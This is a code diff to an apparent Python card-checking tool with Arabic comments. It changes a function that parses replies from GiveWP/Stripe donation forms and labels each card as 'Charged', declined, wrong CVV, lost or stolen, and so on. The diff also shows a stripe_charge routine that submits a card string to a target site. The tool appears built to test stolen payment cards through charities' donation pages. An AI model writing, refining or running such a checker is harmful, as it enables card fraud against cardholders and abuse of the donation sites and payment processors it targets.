@@ -24,61 +24,46 @@ def get_base_url(full_url):
     return f"{parsed.scheme}://{parsed.netloc}"
 
 def extract_stripe_response(text):
-    """تحليل الرد واستخراج رسالة مناسبة (مأخوذة من السكريبت الأصلي)"""
-    error_div = re.search(r'class="give_notices give_errors">(.*?)</div>\s*</div>', text, re.DOTALL)
-    if error_div:
-        raw_error = error_div.group(1)
-        clean_error = re.sub(r'<[^>]+>', '', raw_error)
-        clean_error = unescape(clean_error).strip()
-        clean_error = re.sub(r'\s+', ' ', clean_error)
-        clean_error = clean_error.replace('Error:', '').strip()
-        
-        # استخراج رسائل محددة
-        if 'Your card was declined' in clean_error:
-            return "Your card was declined"
-        elif 'insufficient funds' in clean_error.lower():
-            return "insufficient funds"
-        elif 'security code is incorrect' in clean_error.lower():
-            return "incorrect CVV"
-        elif 'card number is incorrect' in clean_error.lower():
-            return "incorrect card number"
-        elif 'expiration' in clean_error.lower():
-            return "incorrect expiration date"
-        elif 'processing error' in clean_error.lower():
-            return "processing error"
-        elif 'lost' in clean_error.lower() or 'stolen' in clean_error.lower():
-            return "lost or stolen card"
-        elif 'fraud' in clean_error.lower():
-            return "suspected fraud"
-        elif 'do not honor' in clean_error.lower():
-            return "do not honor"
-        elif 'minimum donation' in clean_error.lower():
-            return "minimum donation error"
-        elif 'robot' in clean_error.lower() or 'captcha' in clean_error.lower():
-            return "captcha required"
-        else:
-            # إذا لم نعثر على رسالة محددة، نعيد أول 50 حرفًا
-            return clean_error[:50] + "..." if len(clean_error) > 50 else clean_error
-            
-    if 'give-donation-confirmation' in text or 'donation-confirmation' in text:
+    """تحليل الرد واستخراج رسالة قصيرة ومحددة"""
+    # البحث عن رسائل الخطأ المعروفة
+    if "Your card was declined" in text:
+        return "Your card was declined"
+    elif "insufficient funds" in text.lower():
+        return "insufficient funds"
+    elif "security code is incorrect" in text.lower():
+        return "incorrect CVV"
+    elif "card number is incorrect" in text.lower():
+        return "incorrect card number"
+    elif "expiration" in text.lower():
+        return "incorrect expiration date"
+    elif "processing error" in text.lower():
+        return "processing error"
+    elif "lost" in text.lower() or "stolen" in text.lower():
+        return "lost or stolen card"
+    elif "fraud" in text.lower():
+        return "suspected fraud"
+    elif "do not honor" in text.lower():
+        return "do not honor"
+    elif "minimum donation" in text.lower():
+        return "minimum donation error"
+    elif "robot" in text.lower() or "captcha" in text.lower():
+        return "captcha required"
+    # البحث عن رسائل النجاح
+    elif "thank you for your donation" in text.lower() or "donation confirmed" in text.lower():
         return "Charged"
-    if 'Thank you for your donation' in text:
+    elif "give-donation-confirmation" in text or "donation-confirmation" in text:
         return "Charged"
-        
-    notice_div = re.search(r'class="give_notices[^"]*">(.*?)</div>', text, re.DOTALL)
-    if notice_div:
-        clean_notice = re.sub(r'<[^>]+>', '', notice_div.group(1))
-        clean_notice = unescape(clean_notice).strip()
-        clean_notice = re.sub(r'\s+', ' ', clean_notice)
-        return clean_notice[:50] + "..." if len(clean_notice) > 50 else clean_notice
-        
-    stripe_msg = re.search(r'stripe[_-]?payment[_-]?intent[_-]?error.*?<p>(.*?)</p>', text, re.DOTALL | re.IGNORECASE)
-    if stripe_msg:
-        clean_msg = re.sub(r'<[^>]+>', '', stripe_msg.group(1))
-        clean_msg = unescape(clean_msg).strip()
-        return clean_msg[:50] + "..." if len(clean_msg) > 50 else clean_msg
-        
-    return "Unknown Response"
+    # إذا لم نجد، نعيد نصاً مختصراً
+    else:
+        # محاولة استخراج أي رسالة من عناصر الخطأ
+        error_div = re.search(r'class="give_notices give_errors">(.*?)</div>\s*</div>', text, re.DOTALL)
+        if error_div:
+            raw = re.sub(r'<[^>]+>', '', error_div.group(1))
+            raw = unescape(raw).strip()
+            raw = re.sub(r'\s+', ' ', raw)
+            raw = raw.replace('Error:', '').strip()
+            return raw[:100]  # أول 100 حرف فقط
+        return "Unknown error"
 
 def extract_form_data(html):
     """استخراج الحقول المطلوبة من HTML"""
@@ -323,7 +308,7 @@ def stripe_charge(ccx, site_url, amount):
         final_response = r.post(site_url, params=params_final, cookies=r.cookies, headers=headers_final, data=data_final, timeout=30, allow_redirects=True)
         html_final = final_response.text
 
-        # تحليل الرد باستخدام الدالة المحسنة
+        # تحليل الرد
         result = extract_stripe_response(html_final)
         return result
 
